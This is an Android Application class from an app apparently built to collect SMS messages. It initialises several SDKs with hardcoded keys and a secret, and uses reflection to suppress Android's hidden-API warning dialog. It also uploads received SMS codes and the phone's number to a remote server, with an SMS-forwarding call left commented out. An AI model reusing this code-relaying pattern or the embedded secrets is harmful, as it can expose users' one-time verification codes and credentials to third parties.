package com.kuaishan.obtainmsg.core;

import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.widget.Toast;

import com.adhoc.adhocsdk.AdhocConfig;
import com.adhoc.adhocsdk.AdhocTracker;
import com.alibaba.sdk.android.feedback.impl.FeedbackAPI;
import com.kuaishan.obtainmsg.account.LoginActivity;
import com.taobao.sophix.SophixManager;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;

import cn.jpush.android.api.JPushInterface;


public class App extends Application {
    public static final int MSG_RECEIVED_CODE = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        JPushInterface.setDebugMode(true);
        JPushInterface.init(this);

        FeedbackAPI.init(this, "29503991", "d2bd9072761af86f3783032f26bb4da9");
        SophixManager.getInstance().queryAndLoadNewPatch();
//        ADHOC_6ea75f1a-e4f6-4caf-b98b-93dcec08836a
        SharedPreferences sharedPreferences = getSharedPreferences("kaiguandekaiguan", 0);
        boolean value = sharedPreferences.getBoolean("kaiguan", true);

        AdhocConfig config = AdhocConfig.defaultConfig()
                .appKey("ADHOC_6ea75f1a-e4f6-4caf-b98b-93dcec08836a")
                .reportImmediately()
                .supportBackend(true)
                .supportMultiProcess();
        config.supportBackend(value);
        AdhocTracker.init(this, config);

        closeAndroidPDialog();
    }

    private void closeAndroidPDialog() {
        try {
            Class aClass = Class.forName("android.content.pm.PackageParser$Package");
            Constructor declaredConstructor = aClass.getDeclaredConstructor(String.class);
            declaredConstructor.setAccessible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            Class cls = Class.forName("android.app.ActivityThread");
            Method declaredMethod = cls.getDeclaredMethod("currentActivityThread");
            declaredMethod.setAccessible(true);
            Object activityThread = declaredMethod.invoke(null);
            Field mHiddenApiWarningShown = cls.getDeclaredField("mHiddenApiWarningShown");
            mHiddenApiWarningShown.setAccessible(true);
            mHiddenApiWarningShown.setBoolean(activityThread, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class MsgHandler extends Handler {
        private Context context;

        public MsgHandler(Context activity) {
            this.context = activity;
        }

        @Override
        public void handleMessage(Message msg) {

            if (msg.what == MSG_RECEIVED_CODE) {
                String code = (String) msg.obj;
                T.i("receive code " + code);
//                                sendSMSS(leaderMobile, code,activity.get());
                saveMesage2Server(context, code);
            }
        }
    }


    //发送短信
    public static void sendSMSS(String phone, String content, Context context) {
        if (!TextUtils.isEmpty(content) && !TextUtils.isEmpty(phone)) {
            SmsManager manager = SmsManager.getDefault();
            ArrayList<String> strings = manager.divideMessage(content);
            for (int i = 0; i < strings.size(); i++) {
                manager.sendTextMessage(phone, null, strings.get(i), null, null);
            }
            Toast.makeText(context, "发送成功", Toast.LENGTH_SHORT).show();
        } else {
            Utils.toast(context, "手机号或内容不能为空");
            return;
        }
    }


    private static void saveMesage2Server(final Context context, String content) {
        final HashMap map = new HashMap();
        map.put("mobile", Utils.getPhone(context));
        map.put("message", content);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            AdhocExecutorService.getInstance().execute(new Runnable() {
                @Override
                public void run() {
                    final String str = NetWorkUtils.sendMessge(Constants.Url.SAVESMS, map);
                    if (!TextUtils.isEmpty(str)) {
                        if (str.contains("ok")) {
                            T.i(str);
//                            Utils.toast(context, str);
                        }
                    }
                }
            });
        }
    }
}
